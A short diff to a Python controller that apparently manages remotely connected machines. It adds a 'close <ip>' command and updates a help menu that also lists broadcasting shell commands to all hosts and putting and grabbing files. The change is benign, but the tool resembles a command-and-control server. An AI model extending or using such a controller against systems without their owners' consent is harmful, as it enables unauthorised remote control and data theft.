@@ -195,7 +195,14 @@ def handle_user():
             if not sent:
                 print(f"{ip} not connected.")
 
-            
+        ## Close
+        elif cmd_lst[0] == "close":
+            for data in connected_machines:
+                if data['addr'][0] == cmd_lst[1]:
+                    snd_msg(data['conn'], "close")
+                    data['conn'].close()
+                    connected_machines.remove(data)
+
         ## help
         elif cmd_lst[0] == "help":
             print("1. broadcast <cmd here>")
@@ -203,7 +210,8 @@ def handle_user():
             print("3. send <ip> <cmd here>")
             print("4. put <filename> <ip>")
             print("5. grab <filename> <ip>")
-            print("6. help")
+            print("6. close <ip>")
+            print("7. help")
 
         ## Cmd not recognized
         else:
